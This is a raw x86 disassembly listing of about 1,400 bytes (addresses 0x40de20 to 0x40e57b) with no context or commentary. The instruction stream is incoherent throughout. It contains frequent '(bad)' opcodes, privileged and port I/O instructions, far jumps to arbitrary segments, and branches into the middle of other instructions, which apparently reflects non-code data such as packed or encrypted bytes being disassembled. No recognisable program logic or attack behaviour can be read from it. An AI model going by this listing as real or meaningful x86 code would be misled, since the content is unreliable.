  40de20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de21:	(bad)  
  40de23:	mov    ds,WORD PTR cs:[esp+esi*2]
  40de27:	imul   ecx,edx,0xa2383a16
  40de2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de2e:	ret    
  40de2f:	out    0xcd,eax
  40de31:	pop    ebx
  40de32:	shl    BYTE PTR [ebx],0x11
  40de35:	fs js  0x40de88
  40de38:	es pop esi
  40de3a:	fsub   st(0),st
  40de3c:	(bad)  
  40de3d:	je     0x40deaa
  40de3f:	xchg   esp,eax
  40de40:	mov    DWORD PTR [edx+0x61d603dc],edi
  40de46:	cli    
  40de47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de48:	mov    ds:0xb1a844d5,eax
  40de4d:	pop    es
  40de4e:	das    
  40de4f:	imul   esi,ebp,0xffffffe8
  40de52:	pop    ss
  40de53:	enter  0x80b4,0xec
  40de57:	push   ebx
  40de58:	(bad)  
  40de59:	push   ecx
  40de5a:	pop    esi
  40de5b:	xchg   BYTE PTR [edi],bh
  40de5d:	(bad)  
  40de5e:	dec    edi
  40de5f:	push   ecx
  40de60:	pop    edx
  40de61:	pop    eax
  40de62:	mov    bl,0x74
  40de64:	popf   
  40de65:	xor    eax,0xcd381dec
  40de6a:	xor    eax,0x444ef1a7
  40de6f:	inc    edx
  40de70:	jae    0x40de22
  40de72:	pop    edi
  40de73:	sub    ebp,esi
  40de75:	add    DWORD PTR [edi-0xd],esp
  40de78:	mov    bl,0x99
  40de7a:	jae    0x40de9c
  40de7c:	and    ebx,esi
  40de7e:	stc    
  40de7f:	and    eax,0xc6480cb
  40de84:	sbb    ah,BYTE PTR [edx-0x21]
  40de87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de88:	push   0x14
  40de8a:	pushf  
  40de8b:	mov    al,ds:0xf695b45c
  40de90:	inc    edx
  40de91:	dec    ebx
  40de92:	lods   eax,DWORD PTR ds:[esi]
  40de93:	jne    0x40de1d
  40de95:	lods   al,BYTE PTR ds:[esi]
  40de96:	xchg   ebx,eax
  40de97:	lock popa 
  40de99:	or     ecx,0x1
  40de9c:	in     eax,0x4
  40de9e:	jmp    0x7723:0x4505be54
  40dea5:	or     DWORD PTR [edx],ecx
  40dea7:	cwde   
  40dea8:	push   es
  40dea9:	es jle 0x40dee9
  40deac:	dec    ch
  40deae:	push   cs
  40deaf:	xchg   DWORD PTR [eax+0x31],eax
  40deb2:	xchg   DWORD PTR [ecx+0x63dd7f91],edi
  40deb8:	les    edi,FWORD PTR [eax-0x4b]
  40debb:	fistp  DWORD PTR [ecx]
  40debd:	hlt    
  40debe:	repnz or eax,eax
  40dec1:	dec    edi
  40dec2:	adc    eax,DWORD PTR [esi+eax*8+0x34]
  40dec6:	push   ebx
  40dec7:	pop    ss
  40dec8:	imul   ebx,esp,0xa75b6902
  40dece:	sbb    BYTE PTR [edi],dh
  40ded0:	adc    eax,0xe9af607f
  40ded5:	add    eax,0x5377992d
  40deda:	push   esp
  40dedb:	or     al,0xb3
  40dedd:	mov    ebx,0x3706b709
  40dee2:	addr16 and ebp,esi
  40dee5:	gs sti 
  40dee7:	test   eax,0xd2e987d
  40deec:	or     eax,0xfead6aa
  40def1:	mov    eax,0x58f17a9b
  40def6:	pop    edx
  40def7:	adc    BYTE PTR [eax+0x66],ah
  40defa:	push   esi
  40defb:	outs   dx,BYTE PTR ds:[esi]
  40defc:	shl    DWORD PTR [edx+0x59],0xe
  40df00:	xlat   BYTE PTR ds:[ebx]
  40df01:	sbb    ch,BYTE PTR [edx+0x17]
  40df04:	pop    edi
  40df05:	and    BYTE PTR [esi+0x76],bh
  40df08:	das    
  40df09:	call   0x4f2b7cfb
  40df0e:	ja     0x40de93
  40df10:	(bad)  
  40df12:	ds in  eax,dx
  40df14:	daa    
  40df15:	mov    ds:0x13e91a56,al
  40df1a:	stos   BYTE PTR es:[edi],al
  40df1b:	sbb    eax,ebx
  40df1d:	data16 xor ch,BYTE PTR [eax-0x42]
  40df21:	xchg   ecx,eax
  40df22:	and    BYTE PTR [ecx],ch
  40df24:	mov    WORD PTR [ebp-0x1f7cc412],cs
  40df2a:	cs mov bh,0x5d
  40df2d:	dec    ecx
  40df2e:	call   0x689e:0xf9694ef0
  40df35:	add    cl,cl
  40df37:	add    eax,0x325c83e9
  40df3c:	loope  0x40df81
  40df3e:	ds jge 0x40df0d
  40df41:	dec    ebp
  40df42:	stc    
  40df43:	add    eax,0x11e6a5a8
  40df48:	inc    ebp
  40df49:	dec    esp
  40df4a:	lock sbb al,0x53
  40df4d:	pop    eax
  40df4e:	dec    ecx
  40df4f:	mov    dl,0x4d
  40df51:	xor    eax,DWORD PTR [ebx+esi*8-0x78]
  40df55:	jno    0x40dfcb
  40df57:	int    0xd
  40df59:	jp     0x40df2b
  40df5b:	adc    BYTE PTR [ecx-0x1a],dl
  40df5e:	push   edi
  40df5f:	jns    0x40dfb4
  40df61:	lds    ebp,FWORD PTR [ebx]
  40df63:	pop    edi
  40df64:	fld    DWORD PTR [ecx]
  40df66:	xor    al,0xdf
  40df68:	das    
  40df69:	jmp    0xcae74b3f
  40df6e:	retf   
  40df6f:	pop    ss
  40df70:	jo     0x40dfb3
  40df72:	sbb    dh,BYTE PTR [ebx+ecx*2-0x71]
  40df76:	call   FWORD PTR [esi+edx*4-0x22]
  40df7a:	mov    bh,0x9a
  40df7c:	mov    edi,0x75c34961
  40df81:	or     BYTE PTR [ebp-0x34c59048],dl
  40df87:	pop    ebx
  40df88:	sub    eax,0xcb1a327d
  40df8d:	mov    bl,0x69
  40df8f:	push   ebp
  40df90:	cli    
  40df91:	ins    BYTE PTR es:[edi],dx
  40df92:	mov    esi,0x31a68b1b
  40df97:	loopne 0x40e004
  40df99:	fwait
  40df9a:	jbe    0x40df65
  40df9c:	scas   al,BYTE PTR es:[edi]
  40df9d:	repz in al,0xa4
  40dfa0:	arpl   WORD PTR [edi],cx
  40dfa2:	inc    edx
  40dfa3:	mov    dl,0xa3
  40dfa5:	test   BYTE PTR [edi+0x66],dh
  40dfa8:	add    ebp,ebp
  40dfaa:	shr    eax,1
  40dfac:	mov    al,ds:0x4cff9ecf
  40dfb1:	mov    dh,0x77
  40dfb3:	push   esi
  40dfb4:	adc    eax,0x20cb5bc1
  40dfb9:	stos   DWORD PTR es:[edi],eax
  40dfba:	shl    eax,1
  40dfbc:	ret    
  40dfbd:	call   0xd933:0x4af887be
  40dfc4:	mov    ecx,DWORD PTR [eax]
  40dfc6:	stos   DWORD PTR es:[edi],eax
  40dfc7:	ds push ecx
  40dfc9:	pop    ecx
  40dfca:	ret    
  40dfcb:	sub    BYTE PTR [edx+0x68],dh
  40dfce:	inc    edi
  40dfcf:	dec    ecx
  40dfd0:	mov    bh,0x3f
  40dfd2:	sar    DWORD PTR [esi+ebp*8],1
  40dfd5:	(bad)
  40dfd8:	sbb    bl,BYTE PTR [edi+0x28]
  40dfdb:	lods   al,BYTE PTR ds:[esi]
  40dfdc:	dec    eax
  40dfdd:	push   0x1020ef31
  40dfe2:	mov    BYTE PTR [ebx+0x25],bl
  40dfe5:	mov    ah,0x1a
  40dfe7:	jne    0x40dfb1
  40dfe9:	push   ecx
  40dfea:	push   es
  40dfeb:	mov    cs,ecx
  40dfed:	adc    DWORD PTR [ebx+esi*8-0x71],edx
  40dff1:	test   BYTE PTR [ebx],0x64
  40dff4:	aas    
  40dff5:	or     al,0xe5
  40dff7:	xchg   esp,eax
  40dff8:	jmp    0x40e053
  40dffa:	dec    ebp
  40dffb:	shl    edx,1
  40dffd:	or     dl,al
  40dfff:	(bad)  
  40e000:	jnp    0x40e071
  40e002:	shl    BYTE PTR [ecx],0x1f
  40e005:	cmp    al,0x11
  40e007:	(bad)  
  40e008:	int3   
  40e009:	mov    ?,esp
  40e00b:	or     eax,0xdd74238d
  40e010:	jnp    0x40e013
  40e012:	jg     0x40e033
  40e014:	adc    ch,BYTE PTR [ebx+0xe]
  40e017:	push   esi
  40e018:	dec    esi
  40e019:	cmp    BYTE PTR [edx],bh
  40e01b:	loop   0x40dfda
  40e01d:	sub    bh,BYTE PTR [ebx+0x3236d14c]
  40e023:	add    al,0x76
  40e025:	sub    al,0xe3
  40e027:	mov    ebp,0x5c8512b4
  40e02c:	scas   eax,DWORD PTR es:[edi]
  40e02d:	xor    al,ah
  40e02f:	shl    DWORD PTR [edx],1
  40e031:	sbb    eax,0x7314e476
  40e036:	jl     0x40dfff
  40e038:	enter  0x1a33,0xa8
  40e03c:	sub    edi,DWORD PTR [edi]
  40e03e:	xchg   ch,ch
  40e040:	sub    ch,BYTE PTR [ebp-0x3c]
  40e043:	xchg   cl,dl
  40e045:	cmp    bh,cl
  40e047:	in     eax,dx
  40e048:	sar    DWORD PTR [ebp+0x127b06a6],0x38
  40e04f:	daa    
  40e050:	mov    bh,0xa2
  40e052:	mov    ch,0x0
  40e054:	lahf   
  40e055:	sub    al,BYTE PTR [ecx+0x3b]
  40e058:	mov    eax,ds:0x86ff6f9b
  40e05d:	dec    ecx
  40e05e:	daa    
  40e05f:	xchg   BYTE PTR [ebp+edi*1-0x5b],al
  40e063:	mov    edx,0x428c2a33
  40e068:	inc    ebp
  40e069:	(bad)  
  40e06a:	repz sbb bl,BYTE PTR [eax+0x535c6d7b]
  40e071:	add    al,0x7a
  40e073:	mov    eax,gs
  40e075:	dec    esp
  40e076:	mov    ah,0x30
  40e078:	pop    ebp
  40e079:	punpckhdq mm5,QWORD PTR ds:0x40ab9ec5
  40e081:	retf   0x6003
  40e084:	aad    0x3b
  40e086:	out    0x44,eax
  40e088:	add    ecx,DWORD PTR [edi+0x1e10a75d]
  40e08e:	sbb    eax,0x19d96eab
  40e093:	dec    ebp
  40e094:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e095:	cmp    DWORD PTR [edi-0x4a6797fd],edx
  40e09b:	imul   esp,esi,0x1cca03ee
  40e0a1:	jne    0x40e027
  40e0a3:	mov    cl,0x59
  40e0a5:	dec    ebp
  40e0a6:	popf   
  40e0a7:	add    DWORD PTR [ebp-0x4ae7fb4],edi
  40e0ad:	pop    edx
  40e0ae:	rcl    BYTE PTR [eax+0x6a1f881b],cl
  40e0b4:	mov    edx,DWORD PTR [edx]
  40e0b6:	add    BYTE PTR [ecx-0x4e],ah
  40e0b9:	loop   0x40e12c
  40e0bb:	xchg   cl,al
  40e0bd:	call   0x1e231121
  40e0c2:	rol    BYTE PTR [edx+0x35],1
  40e0c5:	cli    
  40e0c6:	js     0x40e12f
  40e0c8:	(bad)  
  40e0c9:	cmp    ebp,ebp
  40e0cb:	mov    bh,0xcc
  40e0cd:	mov    cl,bh
  40e0cf:	ficom  WORD PTR [edx]
  40e0d1:	xchg   ecx,eax
  40e0d2:	dec    edi
  40e0d3:	cdq    
  40e0d4:	jnp    0x40e0d2
  40e0d6:	push   edx
  40e0d7:	jl     0x40e0c6
  40e0d9:	mov    edi,0x4736afc2
  40e0de:	cmc    
  40e0df:	aaa    
  40e0e0:	dec    edx
  40e0e1:	sub    al,0x4b
  40e0e3:	mov    dh,0xb9
  40e0e5:	and    edi,edx
  40e0e7:	mov    BYTE PTR [esi+ebp*8],ah
  40e0ea:	xor    ebp,DWORD PTR [edx]
  40e0ec:	nop    DWORD PTR [edi+0x3f]
  40e0f0:	xchg   ecx,eax
  40e0f1:	jo     0x40e0a0
  40e0f3:	xor    bh,BYTE PTR [edi+0x4e]
  40e0f6:	jecxz  0x40e0d3
  40e0f8:	repz cwde 
  40e0fa:	sbb    eax,0xce501a81
  40e0ff:	and    ch,BYTE PTR [edi+0x54]
  40e102:	mov    edx,0x19522cf8
  40e107:	inc    ebp
  40e108:	mov    edi,0x24a20642
  40e10d:	repz mov al,0x72
  40e110:	lds    ebp,FWORD PTR [edx]
  40e112:	xor    DWORD PTR [ecx],esp
  40e114:	shl    DWORD PTR [ecx+0xf4d861f],0x21
  40e11b:	cmp    al,0x6a
  40e11d:	int3   
  40e11e:	mov    ebp,0xe9aea87b
  40e123:	lods   al,BYTE PTR ds:[esi]
  40e124:	repnz and ecx,DWORD PTR [ebp-0x13]
  40e128:	in     al,0x95
  40e12a:	sahf   
  40e12b:	or     DWORD PTR cs:[ecx],edi
  40e12e:	icebp  
  40e12f:	adc    eax,DWORD PTR [eax]
  40e131:	fwait
  40e132:	adc    DWORD PTR [edx+ecx*1],esi
  40e135:	mov    bh,0x99
  40e137:	cld    
  40e138:	dec    esp
  40e139:	lahf   
  40e13a:	aaa    
  40e13b:	cmp    DWORD PTR [esi+eax*8-0x22905537],esi
  40e142:	adc    bh,BYTE PTR [edi]
  40e144:	jge    0x40e15f
  40e146:	add    ch,dh
  40e148:	sub    DWORD PTR [edx+0x14],eax
  40e14b:	adc    eax,0x3a58bf88
  40e150:	pop    ss
  40e151:	scas   al,BYTE PTR es:[edi]
  40e152:	clc    
  40e153:	cmp    DWORD PTR [esi-0x7a03c76f],esi
  40e159:	mov    WORD PTR [ebx+eax*8],gs
  40e15c:	cld    
  40e15d:	add    ecx,DWORD PTR [ebx-0x3b4caa88]
  40e163:	and    DWORD PTR [eax+0x2b6cd93c],ebx
  40e169:	and    ebp,esi
  40e16b:	rcr    BYTE PTR [edi+edx*8],0x8c
  40e16f:	add    ah,cl
  40e171:	retf   
  40e172:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e173:	jns    0x40e176
  40e175:	jge    0x40e174
  40e177:	mov    al,ds:0x535d89d1
  40e17c:	ss jb  0x40e149
  40e17f:	xrelease xchg DWORD PTR [eax],esi
  40e182:	dec    eax
  40e183:	fsubr  DWORD PTR [esi]
  40e185:	push   ss
  40e186:	inc    eax
  40e187:	clc    
  40e188:	imul   BYTE PTR [esi-0x1d]
  40e18b:	imul   ecx,DWORD PTR [edx+0x1],0x32
  40e18f:	retf   0xea68
  40e192:	stos   BYTE PTR es:[edi],al
  40e193:	sbb    ebp,DWORD PTR [ebx+edi*1-0x214f5757]
  40e19a:	cmp    ebx,ebx
  40e19c:	fisttp QWORD PTR [eax-0x6645144c]
  40e1a2:	xchg   edx,eax
  40e1a3:	add    al,0xb1
  40e1a5:	(bad)  
  40e1a6:	mov    dh,0x10
  40e1a8:	and    eax,DWORD PTR [ebx]
  40e1aa:	sub    ebx,esp
  40e1ac:	or     eax,0xb2c40858
  40e1b1:	and    al,0xa8
  40e1b3:	add    eax,0xa63da4e2
  40e1b8:	fisttp QWORD PTR [eax-0x300e67de]
  40e1be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1bf:	cli    
  40e1c0:	pop    ebp
  40e1c1:	mov    ebp,0x9e5f54f3
  40e1c6:	(bad)  
  40e1c7:	mov    edx,0xb574f64c
  40e1cc:	and    BYTE PTR [ebp+0x43],0xe7
  40e1d0:	push   esp
  40e1d1:	mov    bl,0x84
  40e1d3:	sbb    al,0x44
  40e1d5:	stos   DWORD PTR es:[edi],eax
  40e1d6:	jns    0x40e1ec
  40e1d8:	fisttp QWORD PTR [ebx+0x63]
  40e1db:	in     eax,dx
  40e1dc:	fdiv   DWORD PTR [edx+0x4c]
  40e1df:	loopne 0x40e22b
  40e1e1:	cmp    eax,0x8a81759c
  40e1e6:	icebp  
  40e1e7:	xchg   ebp,eax
  40e1e8:	int    0xf0
  40e1ea:	jbe    0x40e18f
  40e1ec:	cmp    ebx,ecx
  40e1ee:	ret    
  40e1ef:	cli    
  40e1f0:	push   eax
  40e1f1:	add    bl,BYTE PTR [ebx-0x23]
  40e1f4:	dec    esi
  40e1f5:	sar    ch,0x38
  40e1f8:	mov    esp,0x3cff881e
  40e1fd:	cmp    al,0x3e
  40e1ff:	sbb    eax,0x57326fdc
  40e204:	jnp    0x40e1c9
  40e206:	(bad)
  40e209:	mov    bh,0x27
  40e20b:	data16 fdiv DWORD PTR [edx-0x2b675d6b]
  40e212:	leave  
  40e213:	adc    eax,0xc2d34a2
  40e218:	or     eax,0xf49ee283
  40e21d:	fiadd  DWORD PTR [eax]
  40e21f:	into   
  40e220:	jo     0x40e1ab
  40e222:	in     eax,0xdc
  40e224:	inc    edx
  40e225:	push   DWORD PTR [edx+ebp*2+0x1c7f262c]
  40e22c:	adc    BYTE PTR [edi+0xa],ah
  40e22f:	dec    ecx
  40e230:	ins    DWORD PTR es:[edi],dx
  40e231:	mov    dh,dl
  40e233:	push   0x1e
  40e235:	je     0x40e24b
  40e237:	jg     0x40e242
  40e239:	pop    ebx
  40e23a:	sub    eax,edi
  40e23c:	push   cs
  40e23d:	or     BYTE PTR [ecx-0xd64b313],ah
  40e243:	push   edi
  40e244:	fs mov esp,0xf26ea7b6
  40e24a:	sub    eax,0xffffffc3
  40e24d:	fstp   st(4)
  40e24f:	push   ecx
  40e250:	or     eax,0x68aad6c7
  40e255:	add    DWORD PTR [edx],esi
  40e257:	stos   BYTE PTR es:[edi],al
  40e258:	xchg   BYTE PTR [edi+0x3e],bl
  40e25b:	fst    QWORD PTR [edx-0x76]
  40e25e:	xor    eax,0x8d8c371e
  40e263:	out    0xfc,al
  40e265:	or     ebx,ecx
  40e267:	add    eax,0x4dcef601
  40e26c:	pop    eax
  40e26d:	sub    cl,BYTE PTR [ebx+ebp*4+0x3d]
  40e271:	stc    
  40e272:	xchg   ecx,eax
  40e273:	daa    
  40e274:	inc    eax
  40e275:	dec    esp
  40e276:	in     al,dx
  40e277:	in     al,0x8
  40e279:	jmp    0x40e2aa
  40e27b:	nop
  40e27c:	pop    edi
  40e27d:	rol    BYTE PTR [edi+edi*2+0x8],1
  40e281:	cmp    DWORD PTR [ebx],esi
  40e283:	xlat   BYTE PTR ds:[ebx]
  40e284:	aad    0xb1
  40e286:	inc    ebx
  40e287:	(bad)  
  40e288:	jns    0x40e24d
  40e28a:	xor    ebx,esp
  40e28c:	lahf   
  40e28d:	jg     0x40e2cb
  40e28f:	fsubr  DWORD PTR [ebp+0xb]
  40e292:	repnz lods al,BYTE PTR ds:[esi]
  40e294:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e295:	mov    al,0x85
  40e297:	outs   dx,DWORD PTR cs:[esi]
  40e299:	sbb    al,0xdb
  40e29b:	add    BYTE PTR [edx-0xdc46774],0xa5
  40e2a2:	dec    edx
  40e2a3:	mov    dh,0x9a
  40e2a5:	dec    ebp
  40e2a6:	imul   esi,DWORD PTR ss:[ecx+0x1c],0x38
  40e2ab:	push   ebx
  40e2ac:	test   esi,eax
  40e2ae:	xchg   DWORD PTR [ecx],edx
  40e2b0:	xchg   esp,eax
  40e2b1:	cld    
  40e2b2:	sbb    eax,esi
  40e2b4:	mov    ecx,esi
  40e2b6:	cmp    al,BYTE PTR [eax]
  40e2b8:	fcmovb st,st(5)
  40e2ba:	mov    bl,dh
  40e2bc:	jnp    0x40e25e
  40e2be:	pop    ss
  40e2bf:	xchg   ebx,eax
  40e2c0:	repz jae 0x40e251
  40e2c3:	sbb    DWORD PTR [ebx],ebp
  40e2c5:	mov    esp,0x6a125763
  40e2ca:	or     dh,BYTE PTR [edx+ebp*1]
  40e2cd:	int3   
  40e2ce:	sbb    edx,DWORD PTR [edx+0x2e1ef8a6]
  40e2d4:	cmp    BYTE PTR [ebp-0x58d14074],bl
  40e2da:	jae    0x40e319
  40e2dc:	or     al,0x68
  40e2de:	idiv   DWORD PTR [eax-0x75]
  40e2e1:	dec    edi
  40e2e2:	(bad)
  40e2e5:	mov    esp,0x87f63b04
  40e2ea:	mov    cs,WORD PTR [eax-0x5d394294]
  40e2f0:	ret    
  40e2f1:	fwait
  40e2f2:	xchg   edi,eax
  40e2f3:	repnz ds cwde 
  40e2f6:	jecxz  0x40e2d2
  40e2f8:	pop    edx
  40e2f9:	add    al,0xf8
  40e2fb:	in     al,0xcf
  40e2fd:	(bad)  
  40e2fe:	jge    0x40e352
  40e300:	push   cs
  40e301:	jno    0x40e2a6
  40e303:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e304:	xor    ch,BYTE PTR [esi]
  40e306:	nop
  40e307:	pop    DWORD PTR [esi-0x3e]
  40e30a:	or     BYTE PTR [ecx+eax*2],bh
  40e30d:	outs   dx,BYTE PTR ds:[esi]
  40e30e:	adc    eax,0xec1d24b
  40e313:	sbb    eax,0xb916454f
  40e318:	pop    esi
  40e319:	jns    0x40e395
  40e31b:	or     DWORD PTR [edi],edi
  40e31d:	pop    eax
  40e31e:	stos   BYTE PTR es:[edi],al
  40e31f:	pop    esp
  40e320:	ja     0x40e395
  40e322:	dec    ecx
  40e323:	mov    ecx,0x31f97b5d
  40e328:	sub    bl,BYTE PTR [ecx+0x2bca600e]
  40e32e:	pop    es
  40e32f:	mov    ds,WORD PTR [eax+ebx*1-0x42]
  40e333:	sub    dh,0xf8
  40e336:	push   cs
  40e337:	lods   al,BYTE PTR ds:[esi]
  40e338:	pop    edi
  40e339:	fmul   DWORD PTR [ebp+0x60]
  40e33c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e33d:	pusha  
  40e33e:	neg    BYTE PTR [ecx-0x20ed8a96]
  40e344:	xchg   ecx,eax
  40e345:	outs   dx,DWORD PTR ds:[esi]
  40e346:	cmc    
  40e347:	ds shr ah,1
  40e34a:	(bad)  
  40e34b:	push   ss
  40e34c:	pop    eax
  40e34d:	dec    edx
  40e34e:	sbb    al,0xd2
  40e350:	repz ds retf 0x5ba3
  40e355:	mov    edx,0x49d16966
  40e35a:	and    dh,ch
  40e35c:	imul   esp,ebp,0x3c
  40e35f:	inc    ebx
  40e360:	mov    ecx,ecx
  40e362:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e363:	lock xchg ecx,eax
  40e365:	xor    ah,BYTE PTR [ebp+0xc]
  40e368:	daa    
  40e369:	aam    0xe7
  40e36b:	in     al,0x18
  40e36d:	iret   
  40e36e:	mov    ecx,es
  40e370:	(bad)  
  40e371:	pop    esp
  40e372:	outs   dx,BYTE PTR ds:[esi]
  40e373:	sbb    bl,BYTE PTR [eax+0x0]
  40e376:	test   BYTE PTR [ebx-0x25366bbe],0xa3
  40e37d:	into   
  40e37e:	int3   
  40e37f:	enter  0x80ea,0x27
  40e383:	repz mov esp,0xb2f0960a
  40e389:	loopne 0x40e3f9
  40e38b:	js     0x40e407
  40e38d:	mov    dh,BYTE PTR ss:[ecx+eax*4+0x7f]
  40e392:	pop    es
  40e393:	mov    al,0xa6
  40e395:	ja     0x40e3e3
  40e397:	jno    0x40e3ec
  40e399:	and    dl,BYTE PTR [esi]
  40e39b:	push   es
  40e39c:	pop    eax
  40e39d:	add    al,0xd4
  40e39f:	add    DWORD PTR [ecx-0x7e],edi
  40e3a2:	xchg   edx,eax
  40e3a3:	ins    DWORD PTR es:[edi],dx
  40e3a4:	adc    BYTE PTR [esi-0x6aef2d3c],cl
  40e3aa:	shl    al,0xfd
  40e3ad:	adc    DWORD PTR [ecx],ebx
  40e3af:	or     eax,0x304a12e8
  40e3b4:	rcl    al,0xaf
  40e3b7:	mov    ch,0xe
  40e3b9:	cmc    
  40e3ba:	mov    bh,0x15
  40e3bc:	push   0x17
  40e3be:	push   esi
  40e3bf:	push   cs
  40e3c0:	(bad)  
  40e3c1:	imul   ecx,DWORD PTR [edi-0x21],0x5ac3fe60
  40e3c8:	jnp    0x40e35f
  40e3ca:	fxch   st(4)
  40e3cc:	test   eax,0x9b0d2167
  40e3d1:	pop    edx
  40e3d2:	mov    al,ds:0x6b304207
  40e3d7:	sbb    eax,0x2d543b9f
  40e3dc:	dec    esp
  40e3dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3de:	cwde   
  40e3df:	loope  0x40e403
  40e3e1:	cwde   
  40e3e2:	push   es
  40e3e3:	inc    ebp
  40e3e4:	mov    dh,0x23
  40e3e6:	stc    
  40e3e7:	cmp    DWORD PTR [ecx],edx
  40e3e9:	cdq    
  40e3ea:	xchg   esp,eax
  40e3eb:	mov    edx,0xbc2e171a
  40e3f0:	retf   0xef1b
  40e3f3:	mov    ds:0x8b6dd323,al
  40e3f8:	aaa    
  40e3f9:	xor    BYTE PTR [edi],bh
  40e3fb:	mov    esi,0xeb77da5a
  40e400:	xchg   esp,eax
  40e401:	cs test eax,0x2267bd81
  40e407:	sub    edi,DWORD PTR [esi+0x7]
  40e40a:	mov    cl,0xd1
  40e40c:	fstp   DWORD PTR [eax-0x4050cbe5]
  40e412:	loopne 0x40e3f5
  40e414:	mov    fs,WORD PTR [ecx-0x55]
  40e417:	dec    esp
  40e418:	inc    ebp
  40e419:	xchg   DWORD PTR [eax],ebp
  40e41b:	xor    al,0x5e
  40e41d:	fdivrp st(3),st
  40e41f:	add    BYTE PTR [ecx+0x3a],bl
  40e422:	mov    al,0xd7
  40e424:	mov    dl,0x6e
  40e426:	call   0x2af2:0x55465eca
  40e42d:	loope  0x40e3db
  40e42f:	or     eax,DWORD PTR [ebx+ebp*2-0x9]
  40e433:	mov    eax,0x6547a965
  40e438:	mov    eax,0x9757bd90
  40e43d:	ja     0x40e416
  40e43f:	add    DWORD PTR [esi-0x4afb6d64],eax
  40e445:	outs   dx,BYTE PTR ds:[esi]
  40e446:	cwde   
  40e447:	shr    DWORD PTR [ebp-0x51bdacfc],0x94
  40e44e:	fmul   DWORD PTR [esi-0x2d]
  40e451:	add    al,0xa4
  40e453:	idiv   DWORD PTR ds:0xec1b7a3d
  40e459:	pop    es
  40e45a:	cli    
  40e45b:	dec    ebx
  40e45c:	mov    bh,0x7
  40e45e:	mov    esp,0x67c3d047
  40e463:	add    eax,0x20bc2a84
  40e468:	add    al,0xf5
  40e46a:	jle    0x40e46d
  40e46c:	scas   eax,DWORD PTR es:[edi]
  40e46d:	mov    ebx,0xe0761ee6
  40e472:	inc    edi
  40e473:	lahf   
  40e474:	add    edx,DWORD PTR [edi+ecx*8-0x10fb1b38]
  40e47b:	mov    ah,0x9c
  40e47d:	cs in  al,0x86
  40e480:	jo     0x40e421
  40e482:	sub    DWORD PTR [ebx+0x70],0xc192b60c
  40e489:	out    0xec,eax
  40e48b:	test   eax,0xc1321231
  40e490:	(bad)  
  40e492:	xchg   ebp,eax
  40e493:	cmp    bl,BYTE PTR [esi+0x2b6a2691]
  40e499:	test   al,0xe9
  40e49b:	mov    edi,0x91f35128
  40e4a0:	fstp   DWORD PTR [ecx]
  40e4a2:	sahf   
  40e4a3:	(bad)  
  40e4a4:	out    dx,al
  40e4a5:	aad    0xd6
  40e4a7:	cld    
  40e4a8:	xor    DWORD PTR [esi-0x41a42ddc],ebp
  40e4ae:	data16 jo 0x40e463
  40e4b1:	stc    
  40e4b2:	mov    dl,0xbc
  40e4b4:	xchg   ecx,eax
  40e4b5:	jno    0x40e440
  40e4b7:	push   ebp
  40e4b8:	adc    ch,BYTE PTR ds:0x6853b980
  40e4be:	jnp    0x40e4f3
  40e4c0:	add    esp,DWORD PTR [ecx-0x50f8bd2f]
  40e4c6:	xchg   edi,eax
  40e4c7:	jmp    0x5cbe:0xa52929e2
  40e4ce:	or     ch,al
  40e4d0:	int3   
  40e4d1:	mov    al,ds:0xd3e5d5c
  40e4d6:	xor    BYTE PTR [edi+ecx*2],0x1e
  40e4da:	out    dx,eax
  40e4db:	cwde   
  40e4dc:	js     0x40e4b9
  40e4de:	in     eax,dx
  40e4df:	xchg   ebp,eax
  40e4e0:	jl     0x35232965
  40e4e6:	lock mov ebx,0x11003143
  40e4ec:	sbb    al,0x69
  40e4ee:	pop    esi
  40e4ef:	mov    ch,0x81
  40e4f1:	or     ebp,DWORD PTR [edi+0x6bfda401]
  40e4f7:	adc    cl,ch
  40e4f9:	outs   dx,DWORD PTR ds:[esi]
  40e4fa:	cmp    eax,0x8136cca
  40e4ff:	into   
  40e500:	sbb    dl,cl
  40e502:	jg     0x40e4c5
  40e504:	mov    al,ds:0x20d09c8f
  40e509:	jne    0x40e588
  40e50b:	aas    
  40e50c:	sbb    al,BYTE PTR [ebp-0x653e777c]
  40e512:	cs add ecx,ecx
  40e515:	daa    
  40e516:	dec    esp
  40e517:	mov    edx,DWORD PTR [edx-0xd]
  40e51a:	mov    edx,0x66678fcb
  40e51f:	cmp    bh,ch
  40e521:	inc    ebp
  40e522:	or     dl,BYTE PTR [edx]
  40e524:	(bad)  
  40e525:	xchg   esp,eax
  40e526:	cld    
  40e527:	scas   eax,DWORD PTR es:[edi]
  40e528:	and    eax,0x84282244
  40e52d:	outs   dx,DWORD PTR ds:[esi]
  40e52e:	(bad)  
  40e52f:	sbb    edx,DWORD PTR [ebp-0x19165e8a]
  40e535:	cmc    
  40e536:	dec    edx
  40e537:	popa   
  40e538:	ret    0xdd3e
  40e53b:	jmp    0x40e502
  40e53d:	push   esp
  40e53e:	add    al,0x43
  40e540:	xchg   ebp,eax
  40e541:	popf   
  40e542:	add    eax,0x1b41b73d
  40e547:	sti    
  40e548:	sub    ebx,ecx
  40e54a:	jb     0x40e4e3
  40e54c:	and    dh,BYTE PTR [edi-0x52037b27]
  40e552:	inc    ebx
  40e553:	mov    edi,ebp
  40e555:	mov    esi,0x8fc9f968
  40e55a:	and    al,0x0
  40e55c:	loope  0x40e571
  40e55e:	jne    0x40e568
  40e560:	push   esp
  40e561:	in     al,dx
  40e562:	imul   edx,DWORD PTR [edx+0x52],0xfffffffb
  40e566:	cmp    dh,bl
  40e568:	mov    bh,0xa5
  40e56a:	adc    eax,0x29e61ed1
  40e56f:	push   ebp
  40e570:	xor    dh,BYTE PTR [esi]
  40e572:	fcomp  QWORD PTR [eax+esi*1]
  40e575:	pop    ds
  40e576:	push   edi
  40e577:	pushf  
  40e578:	loope  0x40e5a5
  40e57a:	lods   eax,DWORD PTR ds:[esi]
  40e57b:	sub    eax,0x4d7cb85f
